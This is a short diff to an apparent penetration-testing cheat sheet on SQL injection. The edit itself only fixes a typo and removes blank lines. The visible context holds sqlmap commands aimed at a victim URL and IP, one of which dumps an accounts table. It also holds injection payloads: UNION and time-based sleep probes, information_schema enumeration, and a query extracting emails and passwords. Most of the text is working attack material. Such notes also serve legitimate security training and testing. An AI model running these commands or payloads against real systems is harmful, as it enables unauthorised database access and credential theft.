@@ -736,7 +736,7 @@ Warning: mysql_fetch_array() expects parameter 1 to be mysql_result, boolean giv
 * Needs to know the vulnerable URL and the parameter to test for a SQLi
 
 ```bash
-sqlmap -u <URL> -p <inejction parameter> [options]
+sqlmap -u <URL> -p <injection parameter> [options]
 sqlmap -u 'http://victim.site/view.php?id=1141' -p id --technique=U
 sqlmap -u <url> --data=<POST string> -p id [options] # POST string as user=a&pass=a
 
@@ -755,17 +755,11 @@ sqlmap -u http://10.124.211.96/newsdetails.php?id=1 -D awd -T accounts --dump
 
 ```sql
 1' UNION SELECT 1-- -
-
 3' AND sleep(5) -- -
-
 SELECT 1, schema_name,3 FROM information_schema.schemata limit 1,1-- -
-
 SELECT 1, table_name,3 FROM information_schema.tables WHERE table_schema=hotel limit 1,1-- -
-
 SELECT 1, column_name,3 FROM information_schema.columns WHERE table_schema=hotel and table_name=room limit 1,1
-
 SELECT 1, table_name,3 FROM information_schema.tables limit 1,1-- -
-
 SELECT group_concat(email,0x3a,Password) from awd.accounts limit 1,1;
 ```
 
